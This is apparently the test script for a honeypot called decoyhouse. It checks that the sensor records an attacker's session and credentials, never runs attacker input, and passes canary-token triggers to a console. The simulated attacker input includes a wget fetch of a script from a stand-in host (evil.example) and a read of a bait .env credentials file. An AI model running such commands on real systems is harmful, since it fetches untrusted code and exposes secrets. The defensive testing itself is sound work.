"""
Prove the honeypot does what it claims, and cannot do what it must not.

    python3 tests/test_decoy.py

Three things matter and all three are checked here:

  1. it records an attacker's whole session, credentials and all
  2. it never executes anything the attacker sends
  3. the pieces fit together: a sensor reports to a console, and a canary
     token that gets used shows up there
"""

import os
import socket
import sys
import threading
import time
from http.server import ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

from decoyhouse import bait, console as console_module, store as store_module
from decoyhouse.sensor import Sensor


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def talk(port, lines, pause=0.15):
    """Play an attacker: connect, send each line, collect what comes back."""
    conn = socket.create_connection(("127.0.0.1", port), timeout=5)
    got = []
    time.sleep(pause)
    try:
        got.append(conn.recv(8192))
    except socket.timeout:
        pass
    for line in lines:
        conn.sendall(line + b"\n")
        time.sleep(pause)
        try:
            got.append(conn.recv(8192))
        except socket.timeout:
            got.append(b"")
    conn.close()
    return b"".join(got)


def check(name, ok):
    print("  %-58s %s" % (name, "ok" if ok else "FAILED"))
    return ok


def main():
    failures = 0

    # 1. The bait looks like a real machine and carries tokens.
    world, planted = bait.build(console_host="c.example:8770", sensor_name="t")
    failures += not check("bait builds a filesystem with files", len(world["files"]) > 8)
    failures += not check("every planted token is unique",
                          len(set(t["id"] for t in planted)) == len(planted))
    env = world["files"]["/var/www/app/.env"]
    failures += not check("a token id is actually inside the .env bait",
                          any(t["id"] in env or t["value"].get("access_key_id", "") in env
                              for t in planted if t["kind"] == "aws"))

    # 2. A full session is recorded.
    port = free_port()
    sensor = Sensor(name="test", ports=[port], log_path="/tmp/decoy-test.log")
    sensor.start()
    time.sleep(0.4)

    talk(port, [b"root", b"s3cret", b"ls /home/deploy",
                b"cat /var/www/app/.env", b"wget http://evil.example/x.sh", b"exit"])
    time.sleep(0.4)
    sessions = [s for s in sensor.sessions if s["commands"]]
    failures += not check("the session was recorded", len(sessions) == 1)
    if sessions:
        s = sessions[0]
        failures += not check("the login was captured",
                              s["credentials"] and s["credentials"][0]["password"] == "s3cret")
        failures += not check("reading the .env bait was noticed",
                              any(".env" in f for f in s["read_files"]))
        failures += not check("the download attempt was noticed",
                              any(e["kind"] == "download-attempt" for e in s["events"]))

    # 3. The safety promise: nothing the attacker types runs.
    canary = "/tmp/decoy-must-not-exist"
    if os.path.exists(canary):
        os.remove(canary)
    talk(port, [b"x", b"y", ("touch %s" % canary).encode(),
                ("echo hi > %s" % canary).encode()])
    time.sleep(0.3)
    failures += not check("nothing the attacker typed was executed",
                          not os.path.exists(canary))
    sensor.stop()

    # 4. Sensor to console, and a token trigger arriving.
    db = "/tmp/decoy-test-console.db"
    for suffix in ("", "-wal", "-shm"):
        if os.path.exists(db + suffix):
            os.remove(db + suffix)
    cport = free_port()
    con = console_module.Console(db)
    handler = type("B", (console_module.Handler,), {"console": con, "ui_path": None})
    httpd = ThreadingHTTPServer(("127.0.0.1", cport), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    url = "http://127.0.0.1:%d" % cport

    sport = free_port()
    reporting = Sensor(name="reporting", console=url, ports=[sport],
                       log_path="/tmp/decoy-test2.log")
    reporting.start()
    time.sleep(0.4)
    talk(sport, [b"admin", b"admin", b"cat /home/deploy/office-vpn.ovpn", b"exit"])
    time.sleep(0.5)

    failures += not check("the console received the session",
                          con.store.overview()["counts"]["sessions"] == 1)
    failures += not check("the console knows the planted tokens",
                          con.store.overview()["counts"]["tokens"] == len(reporting.tokens))

    import urllib.request
    token = reporting.tokens[0]
    urllib.request.urlopen(url + "/t/" + token["id"], timeout=5).read()
    time.sleep(0.3)
    failures += not check("a used token was recorded as a trigger",
                          con.store.overview()["counts"]["triggers"] == 1)

    reporting.stop()
    httpd.shutdown()
    con.store.close()

    print()
    if failures:
        print("%d check(s) failed." % failures)
        return 1
    print("All checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
